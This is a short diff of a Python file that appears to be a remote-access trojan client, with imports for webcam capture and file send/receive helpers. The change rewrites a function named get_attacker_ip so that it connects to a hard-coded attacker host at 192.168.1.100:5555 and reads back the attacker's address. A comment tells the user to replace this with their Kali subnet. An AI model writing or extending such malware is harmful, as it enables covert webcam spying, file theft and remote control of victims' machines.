@@ -13,15 +13,15 @@ from webcam import capture_webcam
 from util import send_file, receive_file
 
 def get_attacker_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        return ip[:ip.rfind(".")+1] + "1"
+        s = socket.socket()
+        s.connect(("192.168.1.100", 5555))  # Replace with your Kali subnet
+        ip = s.recv(1024).decode()
+        s.close()
+        return ip
     except:
         return "127.0.0.1"
-    finally:
-        s.close()
+
 
 def reliable_send(s, data):
     json_data = json.dumps(data)
